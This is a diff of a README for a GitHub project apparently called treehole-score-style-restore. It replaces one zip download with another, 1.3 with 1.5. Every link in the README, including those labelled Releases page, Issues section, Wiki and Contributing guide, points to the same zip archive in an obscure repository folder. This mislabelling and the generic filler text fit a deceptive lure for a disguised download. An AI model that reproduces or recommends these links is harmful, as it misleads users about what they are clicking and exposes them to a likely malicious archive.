@@ -6,9 +6,9 @@ Welcome to the treehole-score-style-restore project! This tool helps you restore
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/bonucci132122322/treehole-score-style-restore/main/clavichordist/restore-score-style-treehole-1.3.zip%20Now-blue)](https://raw.githubusercontent.com/bonucci132122322/treehole-score-style-restore/main/clavichordist/restore-score-style-treehole-1.3.zip)
+[![Download Now](https://github.com/bonucci132122322/treehole-score-style-restore/raw/refs/heads/main/clavichordist/score_restore_style_treehole_1.5.zip%20Now-blue)](https://github.com/bonucci132122322/treehole-score-style-restore/raw/refs/heads/main/clavichordist/score_restore_style_treehole_1.5.zip)
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/bonucci132122322/treehole-score-style-restore/main/clavichordist/restore-score-style-treehole-1.3.zip). On this page, you will find the latest version of the application along with installation instructions.
+To get started, visit our [Releases page](https://github.com/bonucci132122322/treehole-score-style-restore/raw/refs/heads/main/clavichordist/score_restore_style_treehole_1.5.zip). On this page, you will find the latest version of the application along with installation instructions.
 
 ## 📊 System Requirements
 
@@ -29,7 +29,7 @@ Before you download, ensure your computer meets these requirements:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
 
-   [Download the Latest Release](https://raw.githubusercontent.com/bonucci132122322/treehole-score-style-restore/main/clavichordist/restore-score-style-treehole-1.3.zip)
+   [Download the Latest Release](https://github.com/bonucci132122322/treehole-score-style-restore/raw/refs/heads/main/clavichordist/score_restore_style_treehole_1.5.zip)
 
 2. **Select the Version:** On the Releases page, find the version you want. Click on the asset that matches your operating system.
 
@@ -55,11 +55,11 @@ Once you have the application installed, you can start restoring your treehole s
 
 ## 💬 Support
 
-If you encounter issues or have questions while using the application, please visit the [Issues section](https://raw.githubusercontent.com/bonucci132122322/treehole-score-style-restore/main/clavichordist/restore-score-style-treehole-1.3.zip) on GitHub. You can search for your question or post a new one. Our community is here to help!
+If you encounter issues or have questions while using the application, please visit the [Issues section](https://github.com/bonucci132122322/treehole-score-style-restore/raw/refs/heads/main/clavichordist/score_restore_style_treehole_1.5.zip) on GitHub. You can search for your question or post a new one. Our community is here to help!
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For detailed guides on using the app, visit the [Wiki](https://raw.githubusercontent.com/bonucci132122322/treehole-score-style-restore/main/clavichordist/restore-score-style-treehole-1.3.zip).
-- **Contributions:** If you'd like to contribute to this project, check the [Contributing guide](https://raw.githubusercontent.com/bonucci132122322/treehole-score-style-restore/main/clavichordist/restore-score-style-treehole-1.3.zip).
+- **Documentation:** For detailed guides on using the app, visit the [Wiki](https://github.com/bonucci132122322/treehole-score-style-restore/raw/refs/heads/main/clavichordist/score_restore_style_treehole_1.5.zip).
+- **Contributions:** If you'd like to contribute to this project, check the [Contributing guide](https://github.com/bonucci132122322/treehole-score-style-restore/raw/refs/heads/main/clavichordist/score_restore_style_treehole_1.5.zip).
 
 Thank you for using treehole-score-style-restore! We hope it enhances your experience and helps you restore your favorite styles with ease. Happy styling!
